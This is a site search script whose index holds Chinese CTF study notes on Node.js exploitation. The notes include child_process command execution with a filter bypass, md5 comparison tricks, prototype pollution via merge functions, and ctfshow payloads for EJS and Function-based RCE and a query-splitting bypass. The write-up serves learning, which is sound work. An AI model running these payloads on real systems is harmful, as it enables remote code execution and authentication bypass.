        <script type="module">
    var suggestions = document.getElementById('suggestions');
    var search = document.getElementById('flexsearch');

    const flexsearchContainer = document.getElementById('FlexSearchCollapse');

    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');

    const configObject = { toggle: false }
    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 

    if (search !== null) {
        document.addEventListener('keydown', inputFocus);
        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
            search.focus();
        });
        
        var topHeader = document.getElementById("top-header");
        document.addEventListener('click', function(elem) {
            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
                flexsearchContainerCollapse.hide();
        });
    }

    hideFlexsearchBtn.addEventListener('click', () =>{
        flexsearchContainerCollapse.hide()
    })

    function inputFocus(e) {
        if (e.ctrlKey && e.key === '/') {
            e.preventDefault();
            flexsearchContainerCollapse.toggle();
        }
        if (e.key === 'Escape' ) {
            search.blur();
            
            flexsearchContainerCollapse.hide();
        }
    };

    document.addEventListener('click', function(event) {

    var isClickInsideElement = suggestions.contains(event.target);

    if (!isClickInsideElement) {
        suggestions.classList.add('d-none');
    }

    });

    


    document.addEventListener('keydown',suggestionFocus);

    function suggestionFocus(e) {
    const suggestionsHidden = suggestions.classList.contains('d-none');
    if (suggestionsHidden) return;

    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
    if (focusableSuggestions.length === 0) return;

    const index = focusableSuggestions.indexOf(document.activeElement);

    if (e.key === "ArrowUp") {
        e.preventDefault();
        const nextIndex = index > 0 ? index - 1 : 0;
        focusableSuggestions[nextIndex].focus();
    }
    else if (e.key === "ArrowDown") {
        e.preventDefault();
        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
        focusableSuggestions[nextIndex].focus();
    }

    }

                description: "命令执行 link require('child_process').exec('ls'); //返回值是child_process，不能转字符串 require('child_process').execSync('ls').toString(); //返回值是字符串 require('child_process').spawnSync('ls').stdout.toString();// 返回object，toString转成字符串 //绕过简单的限制 require('child_process')['exe'+'cSync']('ls').toString() 不用child_process读取文件\n__filename //获取当前文件的绝对路径 __dirname //获取当前文件解析过后的文件夹的绝对路径 require('fs').readFileSync(__filename,'utf-8'); //读取当前文件 require('fs').readdirSync('.') //读取当前目录下所有文件 md5 link if(a \u0026\u0026 b \u0026\u0026 a.length===b.length \u0026\u0026 a!==b \u0026\u0026 md5(a+flag)===md5(b+flag)) 传入a[]=1\u0026b[]=2 得到的是[‘1’]和[‘2’] 而nodejs中数组和字符串的拼接如下：\nconsole.log(5+[6,6]); //56,6 console.log(\"5\"+6); //56 console.log(\"5\"+[6,6]); //56,6 console.log(\"5\"+[\"6\",\"6\"]); //56,6 则[‘a’]+flag== ‘a’+flag\n如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:'1'}\nlet a={ x:'1' } console.log(a+\"flag{123}\") //返回的是： [object Object]flag{123} 所以传入a[x]=1\u0026b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。\n原型链污染 link //定义一个类 function Foo() { this.bar = 1 } new Foo() //类内的方法 function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) this.bar=this.bar+1 } } (new Foo()).show() //输出1 //但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上 //使用原型prototype创建类时，就会只创建一次show方法。 function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() //输出1 //原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。 //foo对象天生就有show方法 //通过proto属性可以访问类的原型，即： foo.__proto__==Foo.prototype 总结： prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法\n",
                content: "命令执行 link require('child_process').exec('ls'); //返回值是child_process，不能转字符串 require('child_process').execSync('ls').toString(); //返回值是字符串 require('child_process').spawnSync('ls').stdout.toString();// 返回object，toString转成字符串 //绕过简单的限制 require('child_process')['exe'+'cSync']('ls').toString() 不用child_process读取文件\n__filename //获取当前文件的绝对路径 __dirname //获取当前文件解析过后的文件夹的绝对路径 require('fs').readFileSync(__filename,'utf-8'); //读取当前文件 require('fs').readdirSync('.') //读取当前目录下所有文件 md5 link if(a \u0026\u0026 b \u0026\u0026 a.length===b.length \u0026\u0026 a!==b \u0026\u0026 md5(a+flag)===md5(b+flag)) 传入a[]=1\u0026b[]=2 得到的是[‘1’]和[‘2’] 而nodejs中数组和字符串的拼接如下：\nconsole.log(5+[6,6]); //56,6 console.log(\"5\"+6); //56 console.log(\"5\"+[6,6]); //56,6 console.log(\"5\"+[\"6\",\"6\"]); //56,6 则[‘a’]+flag== ‘a’+flag\n如果传入的是非数字索引，比如[x]=1，那么就会变为js的对象{x:'1'}\nlet a={ x:'1' } console.log(a+\"flag{123}\") //返回的是： [object Object]flag{123} 所以传入a[x]=1\u0026b[x]=1也能绕过，此时a!==b比较的是内存地址，而不是键值。\n原型链污染 link //定义一个类 function Foo() { this.bar = 1 } new Foo() //类内的方法 function Foo() { this.bar = 1 this.show = function() { console.log(this.bar) this.bar=this.bar+1 } } (new Foo()).show() //输出1 //但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上 //使用原型prototype创建类时，就会只创建一次show方法。 function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() //输出1 //原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。 //foo对象天生就有show方法 //通过proto属性可以访问类的原型，即： foo.__proto__==Foo.prototype 总结： prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法\njs中的继承 linkjs中的继承使用的便是prototype\nfunction Father() { this.first_name = 'Donald' this.last_name = 'Trump' } function Son() { this.first_name = 'Melania' } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) //输出：Name: Melania Trump //此过程为：在son中找last_name，如果找不到就在son.__proto__找，如果还找不到，就在son.__proto__.__proto__里找，依次寻找直到null结束，如Object.prototype的__proto__就是null 原型链污染 link原理 link可以访问原型，也可以修改原型的值\nlet foo = {bar: 1} // foo.bar 此时为1 console.log(foo.bar) // 修改foo的原型（即Object） foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1 console.log(foo.bar) // 此时再用Object创建一个空的zoo对象 let zoo = {} // 查看zoo.bar console.log(zoo.bar) //尽管zoo为空对象，依然输出了1 1 2 //foo.__proto__实际上是一个Object类的实例，所以其实是给这个类新增了一个bar属性。所以新建的zoo继承Object，自然也有bar属性 使用场景 link找到能控制的数组（对象）的键名的操作即可\n对象merge 对象clone function merge(target, source) { for (let key in source) { if (key in source \u0026\u0026 key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } 存在target[key] = source[key]，如果key为__proto__呢\nlet o1 = {} let o2 = {a: 1, \"__proto__\": {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) // 输出1 2 o3 = {} console.log(o3.b) //输出空 合并成功了，但是原型链没有被污染。 因为创建o2的过程let o2 = {a: 1, \"__proto__\": {b: 2}}中，__proto__\"已经代表o2的原型了，遍历键名，得到的是a，b，而不是a,__proto__，也就无法修改原型\nlet o1 = {} let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}') merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) //输出1 2 2，原型链被污染 因为在json解析下，__proto__是一个真正的键名，而不代表原型，后面遍历o2时也能正常获取键名。\n例题： link1 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow==='36dboy'){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)}); } }); 因为存在utils.copy函数\nfunction copy(object1, object2){ for (let key in object2) { if (key in object2 \u0026\u0026 key in object1) { copy(object1[key], object2[key]) } else { object1[key] = object2[key] } } } 所以有原型链污染 传入payload：\n{ \"username\": \"a\", \"__proto__\": { \"ctfshow\": \"36dboy\" } } 2 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); res.render('api', { query: Function(query)(query)}); }); 因为所有变量的最顶层是object，所以若当前上下文不存在query，会自动向上查找object的query属性，故可以进行原型链污染\n{\"username\":\"admin\",\"password\":\"admin\",\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('id')\"}} 3 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var user = new function(){ this.userinfo = new function(){ this.isVIP = false; this.isAdmin = false; this.isAuthor = false; }; } utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'}); } user.__proto__不是Object，是f()。user.__proto__.__proto__才是，所以需要污染两层。\n{ \"__proto__\": { \"__proto__\": { \"query\": \"return global.process.mainModule.constructor._load('child_process').exec('id')\" } } } 4 link router.get('/', function(req, res, next) { res.type('html'); res.render('index'); }); ejs rce\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2\"}}} get绕过 link router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'\u0026\u0026query.password==='ctfshow'\u0026\u0026query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); } }); 正常传入\n{ \"name\": \"admin\", \"password\": \"ctfshow\", \"isVIP\": true } 但过滤了,和/2c，所以即便req.url不进行url解码，也无法传入逗号。 利用req.query.query的特性：传入的相同get参数会加入一个数组，然后JSON.parse会把数组内的元素拼接在一起。 也就是传入query={\"name\":\"admin\"\u0026query=\"password\":\"%63tfshow\"\u0026query=\"isVIP\":true}的话，第一步得到['{\"name\":\"admin\"','\"password\":\"ctfshow\"','\"isVIP\":true}']，第二步就是目标json。 使用%63是防止\"编码后的%22和C变为2c被过滤。\n"
            }
        );
    index.add(
            {
                id:  2 ,
                href: "\/docs\/",
                title: "Docs",
                description: "",
                content: ""
            }
        );
    search.addEventListener('input', show_results, true);

    function show_results(){
        const maxResult =  5 ;
        const minlength =  0 ;
        var searchQuery = sanitizeHTML(this.value);
        var results = index.search(searchQuery, {limit: maxResult, enrich: true});

        
        const flatResults = new Map(); 
        for (const result of results.flatMap(r => r.result)) {
        if (flatResults.has(result.doc.href)) continue;
        flatResults.set(result.doc.href, result.doc);
        }

        suggestions.innerHTML = "";
        suggestions.classList.remove('d-none');

        
        if (searchQuery.length < minlength) {
            const minCharMessage = document.createElement('div')
            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
            minCharMessage.classList.add("suggestion__no-results");
            suggestions.appendChild(minCharMessage);
            return;
        } else {
            
            if (flatResults.size === 0 && searchQuery) {
                const noResultsMessage = document.createElement('div')
                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
                noResultsMessage.classList.add("suggestion__no-results");
                suggestions.appendChild(noResultsMessage);
                return;
            }
        }

        
        for(const [href, doc] of flatResults) {
            const entry = document.createElement('div');
            suggestions.appendChild(entry);

            const a = document.createElement('a');
            a.href = href;
            entry.appendChild(a);

            const title = document.createElement('span');
            title.textContent = doc.title;
            title.classList.add("suggestion__title");
            a.appendChild(title);

            const description = document.createElement('span');
            description.textContent = doc.description;
            description.classList.add("suggestion__description");
            a.appendChild(description);

            suggestions.appendChild(entry);

            if(suggestions.childElementCount == maxResult) break;
        }
    }
    }());
</script>
